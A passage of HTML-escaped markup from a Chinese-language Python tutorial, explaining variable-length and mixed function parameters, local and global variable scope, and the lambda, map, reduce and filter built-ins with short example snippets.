&lt;&#x2F;span&gt;&lt;span&gt; &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;关键字可变长参数（**字典）&lt;&#x2F;p&gt;
&lt;p&gt;def func(**字典)&lt;&#x2F;p&gt;
&lt;p&gt;通过**获取可变数量的参数，并全部放入字典&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span&gt;(**&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;dict&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(dict)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt; &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;c&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;doprint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;age&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;18&lt;&#x2F;span&gt;&lt;span&gt;,*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;list&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;姓名:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt; 年龄:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;%(name,age))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;list:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(i)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt; &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;doprint&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;xiaoming&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;19&lt;&#x2F;span&gt;&lt;span&gt;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;hello&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;world&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;\5.   混合参数&lt;&#x2F;p&gt;
&lt;p&gt;函数在定义参数列表时，可以同时包含位置参数，默认参数，关键字参数，可变参数&lt;&#x2F;p&gt;
&lt;p&gt;混合参数需要按照特定位置放置：位置参数-默认参数-可变参数&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;func&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;x&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;y&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;,*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;tuple&lt;&#x2F;span&gt;&lt;span&gt;,**&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;dict&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(x)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(y)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(tuple)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(dict)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt; &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;func&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;20&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;30&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;40&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;j&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;33&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;在混合参数中，不能使用关键字参数，在调用函数传参的时候，不要使用赋值语句（字典传参例外）&lt;&#x2F;p&gt;
&lt;p&gt;变量作用域&lt;&#x2F;p&gt;
&lt;p&gt;在函数内部定义的变量称为局部变量&lt;&#x2F;p&gt;
&lt;p&gt;变量的作用域指的是该变量能够被使用的范围&lt;&#x2F;p&gt;
&lt;p&gt;局部变量只能在其所属函数中使用&lt;&#x2F;p&gt;
&lt;p&gt;在函数外面，不能访问函数的局部变量&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;A&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    a=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(a)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;B&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    a=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(a)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;a=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(a)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;全局变量&lt;&#x2F;p&gt;
&lt;p&gt;在函数外部定义的变量称为全局变量&lt;&#x2F;p&gt;
&lt;p&gt;全局变量能够被整个程序范围调用&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;C&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    c=a+b&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(c)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;a=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;b=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;C&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;name=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;xiaoming&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;hello&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span&gt;name &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#调用外部变量&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    name=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;haha&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#重新赋值&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Hi&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,name)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;hello&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(name)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;函数式编程&lt;&#x2F;p&gt;
&lt;p&gt;函数式编程是一种高级的编程方法，采用一系列的函数来解决问题，函数式编程是一种面向过程的实现，数据经过不断的输入输出处理。函数式编程采用高阶函数来实现复杂的处理。支持递归、闭包、装饰器等高级特性。&lt;&#x2F;p&gt;
&lt;p&gt;什么是高阶函数？&lt;&#x2F;p&gt;
&lt;p&gt;高阶函数至少包含以下条件之一：&lt;&#x2F;p&gt;
&lt;p&gt;函数作为参数被传入&lt;&#x2F;p&gt;
&lt;p&gt;函数作为结果被输出&lt;&#x2F;p&gt;
&lt;p&gt;lambda&#x2F;map&#x2F;reduce&#x2F;filter 等内置函数、返回函数、递归函数、装饰器等都是高阶函数的应用和实现&lt;&#x2F;p&gt;
&lt;p&gt;内置高阶函数&lt;&#x2F;p&gt;
&lt;p&gt;lambda函数：&lt;&#x2F;p&gt;
&lt;p&gt;匿名函数，当需要一个函数但是不需要这个函数名称的时候，就可以通过lambda表达式来实现 &lt;&#x2F;p&gt;
&lt;p&gt;语法：lambda 参数:表达式&lt;&#x2F;p&gt;
&lt;p&gt;​			lambda x,y:x+y&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;a=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;lambda &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;x&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;y&lt;&#x2F;span&gt;&lt;span&gt;:x+y&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;map函数&lt;&#x2F;p&gt;
&lt;p&gt;map函数接收两个参数，第一个是函数，第二个是列表（可迭代对象）&lt;&#x2F;p&gt;
&lt;p&gt;将函数作用在列表的每个元素上，然后创建由每次函数应用组成的返回值里面&lt;&#x2F;p&gt;
&lt;p&gt;map函数能够用列表解析表达式来实现&lt;&#x2F;p&gt;
&lt;p&gt;map(函数,列表) &lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;a= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;map&lt;&#x2F;span&gt;&lt;span&gt;((&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;lambda &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;x&lt;&#x2F;span&gt;&lt;span&gt;:x*x),[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;])&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(a)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;显示的结果是map对象，不会出现列表[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;9&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;a=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;list&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;map&lt;&#x2F;span&gt;&lt;span&gt;((&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;lambda &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;x&lt;&#x2F;span&gt;&lt;span&gt;:x*x),[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;])) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#转换为列表对象&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(a)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;等价于：&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;x&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;x*x&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;l=[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;map&lt;&#x2F;span&gt;&lt;span&gt;(a,l)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;reduce函数&lt;&#x2F;p&gt;
&lt;p&gt;与map类似，也是接收函数和列表&lt;&#x2F;p&gt;
&lt;p&gt;区别在于reduce将列表中两个元素放入函数计算得到值，然后将值和列表中的下一个元素再放入函数计算得到另一个值，最终会得到一个值&lt;&#x2F;p&gt;
&lt;p&gt;语法：&lt;&#x2F;p&gt;
&lt;p&gt;reduce(函数,列表)&lt;&#x2F;p&gt;
&lt;p&gt;reduce(func,[1,2,3]) &lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;functools &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;reduce&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;a=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;reduce&lt;&#x2F;span&gt;&lt;span&gt;((&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;lambda &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;x&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;y&lt;&#x2F;span&gt;&lt;span&gt;: x+y),[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;])&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(a)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Python2中可以直接调用reduce函数，Python3需要从模块functools先导入&lt;&#x2F;p&gt;
&lt;p&gt;filter函数&lt;&#x2F;p&gt;
&lt;p&gt;是一个过滤函数，根据Ture或者False来决定最终的结果，如果是True则保留下来&lt;&#x2F;p&gt;
&lt;p&gt;filter(函数,列表) &lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;pos&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;n&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;n&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;a=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;list&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;filter&lt;&#x2F;span&gt;&lt;span&gt;(pos,[-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;,-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span 